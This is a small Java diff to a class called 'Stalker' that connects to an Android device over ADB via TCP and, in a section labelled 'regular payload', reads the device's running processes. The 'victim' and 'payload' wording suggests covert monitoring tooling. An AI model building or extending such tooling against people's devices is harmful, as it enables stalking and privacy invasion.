@@ -3,7 +3,7 @@ package core;
 public class Stalker implements Runnable{
 	
 	private Adb adb;
-	DeviceInfo device;
+	public DeviceInfo device;
 	boolean victimConnected;
 	
 	public Stalker(DeviceInfo device)
@@ -31,14 +31,18 @@ public class Stalker implements Runnable{
 			if (!device.tcpConnected)
 				adb.connectTCP();
 			
+			
+			
+			
 			// 2. regular payload
-			device.runningProcesses = P.read(adb.sendCmd("shell ps").getInputStream());
-			P.print(device.runningProcesses);
+			device.runningProcesses = adb.getRunningProcesses();
+			//P.print(device.runningProcesses);
+			
 			
 			
 			
 			// 3. on-demand payload
-
+			
 			
 			
 			
